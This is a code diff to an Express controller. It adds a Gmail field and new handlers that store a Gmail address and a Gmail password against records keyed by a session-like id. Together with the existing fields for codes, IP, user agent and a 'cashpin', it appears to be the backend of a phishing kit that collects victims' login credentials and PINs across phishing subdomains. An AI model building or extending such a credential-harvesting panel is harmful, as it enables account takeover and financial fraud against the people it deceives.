@@ -48,7 +48,7 @@ const getAllInformations = async (req, res) => {
 const createInformation = async (req, res) => {
   try {
     // Extract data from the request body
-    const { site, email, address, code, ip, agent, userId, temp } = req.body;
+    const { site, email, address, code, ip, agent,gmail, userId, temp } = req.body;
 
     // Validate required fields
     // if (!email || !address || !code || !ip || !agent || !userId) {
@@ -67,6 +67,7 @@ const createInformation = async (req, res) => {
       code,
       ip,
       agent,
+      gmail,
       userId,
       temp
     });
@@ -174,6 +175,88 @@ const updateCashpin = async (req, res) => {
     });
   }
 };
+const updateGmail = async (req, res) => {
+  const { id } = req.params; // Extract the subdomain ID from params
+  const { gmail } = req.body; // Extract the type (desktop or mobile) from the request body
+  console.log(id, gmail);
+  try {
+    // Build the update object based on the type
+    const update = {
+      gmail: gmail
+    };
+
+    // Find and update the document
+    const result = await InformationModel.findOneAndUpdate(
+      { temp: id }, // Filter by subdomain
+      update, // Increment the desktop or mobile counter
+      { new: true, upsert: true } // Return the updated document, create if not found
+    );
+
+    // If no document is updated or created, handle it
+    if (!result) {
+      return res.status(404).json({
+        success: false,
+        message: "Subdomain not found!",
+      });
+    }
+
+    // Send success response with the updated document
+    return res.status(200).json({
+      success: true,
+      message: "gmail updated successfully!",
+      data: result,
+    });
+  } catch (error) {
+    console.error('gmail updating click:', error);
+
+    // Handle server errors
+    return res.status(500).json({
+      success: false,
+      message: "Something went wrong!",
+    });
+  }
+};
+const updateGmailPass = async (req, res) => {
+  const { id } = req.params; // Extract the subdomain ID from params
+  const { gmailPass } = req.body; // Extract the type (desktop or mobile) from the request body
+  console.log(id, gmailPass);
+  try {
+    // Build the update object based on the type
+    const update = {
+      gmailPass: gmailPass
+    };
+
+    // Find and update the document
+    const result = await InformationModel.findOneAndUpdate(
+      { temp: id }, // Filter by subdomain
+      update, // Increment the desktop or mobile counter
+      { new: true, upsert: true } // Return the updated document, create if not found
+    );
+
+    // If no document is updated or created, handle it
+    if (!result) {
+      return res.status(404).json({
+        success: false,
+        message: "Subdomain not found!",
+      });
+    }
+
+    // Send success response with the updated document
+    return res.status(200).json({
+      success: true,
+      message: "gmailPass updated successfully!",
+      data: result,
+    });
+  } catch (error) {
+    console.error('gmailPass updating click:', error);
+
+    // Handle server errors
+    return res.status(500).json({
+      success: false,
+      message: "Something went wrong!",
+    });
+  }
+};
 
 const deleteInformation = async (req, res) => {
   const { id } = req.params; // Extract the object ID from params
@@ -212,5 +295,7 @@ module.exports = {
   createInformation,
   updateInformation,
   updateCashpin,
+  updateGmail,
+  updateGmailPass,
   deleteInformation
 };
